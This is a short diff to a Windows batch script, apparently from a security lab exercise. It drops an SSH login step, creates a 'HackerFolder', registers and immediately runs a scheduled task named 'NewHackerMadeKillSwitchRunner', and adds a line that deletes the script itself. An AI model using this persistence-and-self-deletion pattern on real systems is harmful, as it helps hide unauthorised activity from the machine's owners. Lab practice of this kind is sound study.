@@ -1,6 +1,3 @@
-:: SSH into Computer
-ssh C4MLabuser9@172.16.6.29
-
 :: Create HackerFolder
 mkdir "C:\Users\c4mlabuser9\Desktop\HackerFolder"
 
@@ -23,6 +20,8 @@ schtasks /Create /TN "NewHackerMadeKillSwitchRunner" ^
 
 :: Run the task immediately
 schtasks /Run /TN "NewHackerMadeKillSwitchRunner"
+
+del "%~f0"
 
 pause
 
